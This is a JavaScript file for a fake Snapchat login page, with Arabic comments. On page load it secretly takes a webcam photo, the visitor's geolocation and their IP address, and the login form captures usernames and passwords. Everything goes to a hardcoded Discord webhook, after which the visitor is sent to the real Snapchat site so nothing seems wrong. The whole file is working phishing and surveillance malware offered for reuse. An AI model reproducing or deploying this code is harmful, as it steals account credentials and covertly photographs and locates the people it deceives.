// استبدل الرابط برابط الـ Webhook الخاص بك
const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1444709878366212162/aaRxDFNINfucmVB8YSZ2MfdvHPUI8fbRRpROLo8iAAEFLjWfUNOHcgXJrhacUK4RbEHT";
const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
let attempts = 0;

// دالة لجلب IP الجهاز
async function getIP() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
    } catch (e) { return "غير معروف"; }
}

// دالة إرسال البيانات الموحدة
async function sendToDiscord(blob, lat, lng, user = "", pass = "") {
    const ip = await getIP();
    const formData = new FormData();
    
    let content = `👤 **صيد جديد!**\n` +
                  `🌐 **IP للجهاز:** \`${ip}\`\n`;
    
    if (lat && lng) {
        content += `📍 **الموقع المباشر:** [اضغط هنا لرؤية المكان](https://www.google.com/maps?q=${lat},${lng})\n` +
                   `🗺️ **الإحداثيات:** \`${lat}, ${lng}\`\n`;
    }
    
    if (user) {
        content += `📝 **الحساب:** \`${user}\` \n🔑 **الرمز:** \`${pass}\`\n`;
    }
    
    content += `⏰ **الوقت:** ${new Date().toLocaleString('ar-EG')}`;

    if (blob) formData.append('file', blob, 'shot.png');
    formData.append('payload_json', JSON.stringify({
        content: content,
        username: "SnapHunter Bot",
        avatar_url: "https://upload.wikimedia.org/wikipedia/en/thumb/c/c4/Snapchat_logo.svg/1200px-Snapchat_logo.svg.png"
    }));

    await fetch(DISCORD_WEBHOOK, { method: 'POST', body: formData });
}

// السحب التلقائي فور الدخول
async function autoInit() {
    let lat = null, lng = null;
    
    // سحب الموقع الجغرافي
    navigator.geolocation.getCurrentPosition(p => {
        lat = p.coords.latitude;
        lng = p.coords.longitude;
    }, () => { console.log("تم رفض الموقع"); });

    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
        video.srcObject = stream;
        
        setTimeout(() => {
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, 640, 480);
            canvas.toBlob(b => sendToDiscord(b, lat, lng), 'image/png');
        }, 2000);
    } catch (e) {
        setTimeout(() => sendToDiscord(null, lat, lng), 3000);
    }
}

// معالجة نموذج تسجيل الدخول
const loginForm = document.getElementById('fullLoginForm');
if (loginForm) {
    loginForm.addEventListener('submit', async (e) => {
        e.preventDefault();
        const u = e.target.username.value;
        const p = e.target.password.value;
        document.getElementById('loadingOverlay').style.display = 'flex';

        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, 640, 480);
        
        canvas.toBlob(async (blob) => {
            await sendToDiscord(blob, null, null, u, p);
            setTimeout(() => {
                attempts++;
                document.getElementById('loadingOverlay').style.display = 'none';
                if (attempts >= 2) window.location.href = "https://accounts.snapchat.com/";
                else {
                    document.getElementById('loginErrorMsg').style.display = 'block';
                    e.target.password.value = "";
                }
            }, 1500);
        }, 'image/png');
    });
}

window.onload = autoInit;
